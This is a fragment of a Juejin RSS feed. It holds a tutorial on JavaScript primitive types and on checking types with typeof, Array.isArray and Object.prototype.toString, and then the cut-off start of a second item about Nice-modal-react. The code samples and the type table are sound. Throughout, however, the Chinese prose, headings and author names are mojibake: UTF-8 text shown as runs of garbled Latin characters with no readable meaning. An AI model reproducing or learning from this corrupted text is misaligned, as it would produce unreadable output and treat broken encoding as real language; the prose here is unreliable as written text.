            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2386391857112611/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç é€”æ½‡æ½‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:33:17.000Z" title="Thu Jan 08 2026 08:33:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScriptæœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå˜é‡çš„æ•°æ®ç±»å‹ï¼Ÿ</h2>
<p>JavaScript æœ‰å…¶å†…å»ºçš„æ•°æ®ç±»å‹ã€‚å…¶ä¸­åˆåˆ†ä¸ºåŸç”Ÿå€¼ï¼ˆprimitive valuesï¼‰å’Œå¯¹è±¡ï¼ˆobjectsï¼‰ã€‚</p>
<h2 data-id="heading-1">1.JavaScript çš„åŸç”Ÿå€¼ (primitive values)</h2>
<p>æˆªè‡³ç›®å‰ï¼ŒJavaScript çš„èµ„æ–™å‹åˆ«ä¸­ï¼Œæœ‰ä¸ƒä¸ªåŸç”Ÿå€¼ã€‚è¿™ä¸ƒä¸ªåŸç”Ÿå€¼ä»¥å¤–çš„ï¼Œå…¨éƒ½æ˜¯å±äºå¯¹è±¡ã€‚</p>
<p>åŸç”Ÿå€¼æ˜¯ä¸å¯å˜çš„(immutable)ï¼Œæ„æ€æ˜¯æˆ‘ä»¬ä¸èƒ½æ”¹å˜é‚£ä¸ªå€¼æœ¬èº«ã€‚æ¯”å¦‚å½“æˆ‘ä»¬â€œä¿®æ”¹â€åŸå§‹å€¼æ—¶ï¼Œå®é™…ä¸Šæ˜¯è®©å˜é‡é‡æ–°ç»‘å®šåˆ°ä¸€ä¸ªæ–°çš„å€¼ï¼Œè€Œä¸æ˜¯åœ¨åŸå€¼ä¸Šè¿›è¡Œä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> greeting = <span class="hljs-string">"Hi"</span>;
greeting = <span class="hljs-string">"Hello"</span>; <span class="hljs-comment">// æ­¤æ—¶è™½ç„¶æ‰“å° greeting æ˜¯ Helloï¼Œä½†æ˜¯ Hi è¿™ä¸ªå€¼æœ¬èº«æ˜¯æ²¡å˜çš„ï¼Œåªæ˜¯ greeting æŒ‡å‘äº†Hello è¿™ä¸ªæ–°å€¼</span>
</code></pre>
<p>JavaScript çš„å‹åˆ«ä¸­çš„ä¸ƒä¸ªåŸç”Ÿå€¼åŒ…å«ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FString" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String" ref="nofollow noopener noreferrer">String</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2Fboolean" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/boolean" ref="nofollow noopener noreferrer">Boolean</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2Fnull" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/null" ref="nofollow noopener noreferrer">Null</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2Fundefined" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/undefined" ref="nofollow noopener noreferrer">Undefined</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2Fnumber" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/number" ref="nofollow noopener noreferrer">Number</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2Fbigint" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/bigint" ref="nofollow noopener noreferrer">BigInt</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FSymbol" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol" ref="nofollow noopener noreferrer">Symbol</a></li>
</ul>
<h3 data-id="heading-2">1.1 å­—ç¬¦ä¸² String</h3>
<p>String (å­—ç¬¦ä¸²)</p>
<p>å­—ä¸²æ˜¯æœ€å¸¸è§çš„åŸç”Ÿå€¼ä¹‹ä¸€ã€‚å¦‚å‰é¢æåˆ°ï¼Œåœ¨JavaScript å½“ä¸­å­—ä¸²æœ¬èº«æ˜¯ä¸å¯å˜çš„ã€‚å½“æˆ‘ä»¬ç”¨<code>substring()</code>æ¥æ’·å–å­—ä¸²ï¼Œæˆ–ç”¨<code>concat()</code>æ¥æŠŠä¸¤ä¸ªå­—ä¸²åˆä¸ºä¸€ï¼Œè¿™äº›éƒ½æ˜¯ä¼šå›ä¼ å¦ä¸€ä¸ªå­—ä¸²ï¼Œè€Œéæ”¹å˜åŸæœ¬çš„å­—ä¸²ã€‚</p>
<h3 data-id="heading-3">1.2 å¸ƒå°”å€¼ Boolean</h3>
<p>Boolean (å¸ƒå°”å€¼)</p>
<p>æœ‰<code>true</code>ä¸<code>false</code>ä¸¤ä¸ªå€¼çš„å¸ƒæ—å€¼ï¼Œä¹Ÿæ˜¯JavaScript çš„åŸç”Ÿå€¼ã€‚</p>
<h3 data-id="heading-4">1.3 Number</h3>
<p>JavaScript ä¸ä¸€äº›è¯­è¨€ä¸åŒï¼Œæ²¡æœ‰åˆ†æ•´æ•°ä¸æµ®ç‚¹æ•°ï¼Œè€Œæ˜¯éƒ½ç”¨<code>number</code>è¿™ä¸ªåŸç”Ÿå€¼ã€‚ä¸è®ºæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼Œéƒ½æ˜¯<code>number</code>è¿™ä¸ªå‹åˆ«ã€‚åœ¨JavaScript å½“ä¸­ï¼Œ<code>+Infinity</code>, <code>-Infinity</code>, ä¸  <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FNaN" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NaN" ref="nofollow noopener noreferrer">NaN</a> éƒ½æ˜¯<code>number</code>è¿™ä¸ªå‹åˆ«ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨<code>typeof</code>æ¥æ£€æŸ¥çš„è¯ï¼Œä¼šå¾—åˆ°<code>number</code>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NaN</span>); <span class="hljs-comment">// number</span>
</code></pre>
<p>è€Œ<code>number</code>åœ¨JavaScript æ˜¯åŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œæ‰€ä»¥ç²¾ç¡®åº¦æ˜¯ä»‹äº<code>-(2^53 âˆ’ 1)</code>ä¸<code>2^53 âˆ’ 1</code>ä¹‹é—´ã€‚åœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–ï¼Œå°±ä¼šæœ‰ç²¾å‡†åº¦çš„é—®é¢˜ï¼Œè¿™æ—¶å€™è¦ç”¨å¦ä¸€ä¸ªåŸç”Ÿå€¼<code>BigInt</code>ã€‚</p>
<h3 data-id="heading-5">1.4 BigInt</h3>
<p>ä¸Šé¢æåˆ°åœ¨JavaScript çš„æ•´æ•°ä¸æµ®ç‚¹æ•°ï¼Œéƒ½æ˜¯ç”¨<code>number</code>è¿™ä¸ªå‹åˆ«ï¼Œè¿™å…¶å®åªè¯´äº†ä¸€åŠã€‚å› ä¸ºJavaScript çš„<code>number</code>ç²¾å‡†åº¦æœ‰å…¶é™åˆ¶ï¼Œè™½ç„¶å¤šæ•°æƒ…å†µå¾ˆå¤Ÿç”¨(<code>2^53 - 1</code>ä¼šæ˜¯9007199254740991ï¼Œæˆ‘ä»¬å¾ˆå°‘ç”¨åˆ°æ¯”è¿™å¤§çš„æ•°)ã€‚ä½†æœ‰äº›æ—¶å€™ä¼šéœ€è¦æ›´å¾€ä¸‹çš„ç²¾å‡†åº¦ã€‚è¿™æ—¶å°±å¯ä»¥ç”¨<code>BigInt</code>æ•°å€¼çš„å‹åˆ«ã€‚</p>
<p><code>BigInt</code>å¯ä»¥è®©æˆ‘ä»¬ä»»æ„é€‰æ‹©å…¶ç²¾å‡†åº¦ï¼Œå°±å¯ä»¥é¿å…ä¸€äº›<code>number</code>ä¼šé‡åˆ°çš„é—®é¢˜ã€‚å®ƒè·Ÿ<code>number</code>ä¸€æ ·å¯ä»¥ç”¨<code>+</code>, <code>*</code>, <code>-</code>, <code>**</code>, ä¸  <code>%</code>ç­‰è¿ç®—å­ï¼Œä¸è¿‡è¦æ³¨æ„ä¸å¯ä»¥æ‹¿<code>BigInt</code>è·Ÿ<code>number</code>å‹åˆ«çš„å€¼äº¤äº’ä½¿ç”¨ï¼Œè¿™ä¼šå‡ºç°<code>TypeError</code>ã€‚</p>
<h3 data-id="heading-6">1.5 Undefined</h3>
<p><code>undefined</code>æ˜¯ä¸€ä¸ªç±»å‹ï¼Œå®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå€¼ã€‚</p>
<ul>
<li>
<p>å‡å¦‚æŸä¸ªå˜é‡æœªå£°æ˜å°±æ˜¯ç”¨ï¼Œä¼šå‡ºç°ç´¢å¼•é”™è¯¯ReferenceError</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);

<span class="hljs-title class_">ReferenceError</span>: a is not defined
</code></pre>
</li>
<li>
<p>ç”¨ let / const å£°æ˜äº†ï¼Œä½†åœ¨å£°æ˜å‰ä½¿ç”¨</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);
<span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>;

<span class="hljs-title class_">ReferenceError</span>: <span class="hljs-title class_">Cannot</span> access <span class="hljs-string">'a'</span> before initialization
</code></pre>
</li>
<li>
<p>æŸä¸ªå˜é‡å£°æ˜ä½†æ˜¯æ²¡æœ‰èµ‹å€¼</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> greeting;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(greeting); <span class="hljs-comment">// undefined</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-7">1.6 Null</h3>
<p><code>null</code>æ˜¯å¾ˆå®¹æ˜“è·Ÿ<code>undefined</code>ææ··çš„åŸç”Ÿå€¼ã€‚<code>undefined</code>æ˜¯å› ä¸ºæŸå˜æ•°è¿˜æ²¡æœ‰èµ‹å€¼ï¼Œæ‰€ä»¥å¯¹JavaScript æ¥è¯´ï¼Œå®ƒä¸çŸ¥é“è¯¥å˜æ•°çš„å€¼æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥è¦è¯»å–è¯¥å˜æ•°æ—¶ï¼Œä¼šæ˜¯<code>undefined</code>ã€‚ä¸è¿‡ åˆ™<code>null</code>æ˜¯æˆ‘ä»¬èµ‹äºˆæŸä¸ªå˜æ•°<code>null</code>è¿™ä¸€ä¸ªå€¼ã€‚</p>
<h3 data-id="heading-8">1.7 Symbol</h3>
<p>æœ€åä¸€ä¸ªJavaScript åŸç”Ÿå€¼æ˜¯<code>Symbol</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‹¬ç‰¹(unique) å€¼ï¼Œå¤šåŠä¼šæ­é…ç‰©ä»¶ä¸€èµ·ä½¿ç”¨ï¼Œä½œä¸ºç‰©ä»¶çš„é”®(key)ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sym = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"ExplainYYDS"</span>);
<span class="hljs-keyword">const</span> obj = { [sym]: <span class="hljs-string">"Interview Preps for Software Engineers"</span> };
obj[sym]; <span class="hljs-comment">// Interview Preps for Software Engineers</span>
</code></pre>
<h2 data-id="heading-9">2.JavaScriptä¸­çš„å¯¹è±¡(objects)</h2>
<p>é™¤äº†ä¸Šè¿°çš„ä¸ƒä¸ªåŸç”Ÿå€¼ä»¥å¤–çš„å­˜åœ¨ï¼Œåœ¨JavaScript å½“ä¸­éƒ½æ˜¯å¯¹è±¡ã€‚</p>
<p>JavaScript åœˆæœ‰ä¸€ä¸ªæ¢—ï¼Œæ•°ç»„æ˜¯å¯¹è±¡ï¼Œå‡½æ•°æ˜¯å¯¹è±¡ï¼Œå¯¹è±¡æ˜¯å¯¹è±¡ã€‚</p>
<h2 data-id="heading-10">3. å¦‚ä½•è¾¨åˆ«ä¸€ä¸ªå˜é‡çš„æ•°æ®ç±»å‹ï¼Ÿ</h2>
<h3 data-id="heading-11">3.1 ä½¿ç”¨typeofåˆ¤æ–­å˜é‡çš„æ•°æ®ç±»å‹</h3>
<p>è¦è¾¨åˆ«ä¸€ä¸ªå˜æ•°çš„æ•°æ®ç±»å‹ï¼Œæœ€å¸¸è§çš„æ–¹å¼æ˜¯é€è¿‡<code>typeof</code>è¿™ä¸ªæ–¹æ³•ã€‚ä¸¾ä¾‹æ¥è¯´<code>typeof</code>åˆ¤æ–­å­—ç¬¦ä¸²ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> greeting = <span class="hljs-string">"hi"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> greeting); <span class="hljs-comment">// 'string'</span>
</code></pre>
<p>typeof çš„ä¸¤ä¸ªæ³¨æ„ç‚¹</p>
<ul>
<li>typeof åŸç”Ÿå€¼ï¼Œè¿”å›çš„æ˜¯è¯¥åŸç”Ÿå€¼çš„ç±»å‹æ ‡è¯†å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ typeof null ç»“æœä¸æ˜¯ nullï¼Œè€Œæ˜¯objectï¼Œè¿™ä¸ªå†å²é—ç•™çš„ bugï¼Œä¿®å¤æˆæœ¬å¤ªé«˜äº†</li>
<li>typeof æ•°ç»„çš„ç»“æœæ˜¯ object ï¼Œtpyeof å‡½æ•°çš„ç»“æœæ˜¯ function</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>); <span class="hljs-comment">// object</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> []); <span class="hljs-comment">// object</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {}); <span class="hljs-comment">// function</span>
</code></pre>
<p>è¡¥å……<code>typeof</code>ç»“æœçš„è¡¨æ ¼</p>









































<table><thead><tr><th>Type of val</th><th>Result</th></tr></thead><tbody><tr><td>Undefined</td><td>"undefined"</td></tr><tr><td>Null</td><td>"object"</td></tr><tr><td>Boolean</td><td>"boolean"</td></tr><tr><td>Number</td><td>"number"</td></tr><tr><td>String</td><td>"string"</td></tr><tr><td>Object (native and does not implement [[Call]])</td><td>"object"</td></tr><tr><td>Object (native or host and does implement [[Call]])</td><td>"function"</td></tr><tr><td>Object (host and does not implement [[Call]])</td><td>Implementation-defined except may not be "undefined", "boolean", "number", or "string".</td></tr></tbody></table>
<p>å› ä¸º typeof æ— æ³•åˆ¤æ–­æ•°ç»„å’Œå¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦æ–°çš„æ–¹æ³•å»åˆ¤æ–­æŸä¸ªå˜é‡æ˜¯å¯¹è±¡è¿˜æ˜¯æ•°ç»„ã€‚</p>
<h3 data-id="heading-12">3.2 åˆ¤æ–­å˜é‡æ˜¯å¯¹è±¡è¿˜æ˜¯æ•°ç»„ï¼Ÿ</h3>
<p><code>Array.isArray()</code>æ˜¯å¯ä»¥ååŠ©æˆ‘ä»¬çš„æ–¹æ³•ã€‚å¦‚æœæ˜¯æ•°ç»„ï¼Œä¼šå›ä¼ <code>true</code>ï¼›ä½†è‹¥æ˜¯ä¸€èˆ¬å¯¹è±¡ï¼Œåˆ™ä¼šå›ä¼ <code>false</code>ã€‚ä¸¾ä¾‹æ¥è¯´ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// true</span>
<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>({ <span class="hljs-attr">foo</span>: <span class="hljs-number">123</span> }); <span class="hljs-comment">// false</span>
</code></pre>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€è¿‡<code>Object.prototype.toString()</code>çš„æ–¹æ³•å¸®åŠ©æˆ‘ä»¬è¾¨åˆ«æ•°ç»„ã€å‡½æ•°ä¸ä¸€èˆ¬å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>;
};
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">foo</span>: <span class="hljs-number">123</span> };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(arr)); <span class="hljs-comment">// [object Array]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(fn)); <span class="hljs-comment">// [object Function]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj)); <span class="hljs-comment">// [object Object]</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nice-modal-reactçš„ä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7592765004807634995</link>    <guid>https://juejin.cn/post/7592765004807634995</guid>    <pubDate>2026-01-08T08:53:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807634995" data-draft-id="7592765004807569459" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nice-modal-reactçš„ä½¿ç”¨"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T08:53:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç»†å¿ƒç»†å¿ƒå†ç»†å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/721738373803879"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nice-modal-reactçš„ä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/721738373803879/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç»†å¿ƒç»†å¿ƒå†ç»†å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:53:02.000Z" title="Thu Jan 08 2026 08:53:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body 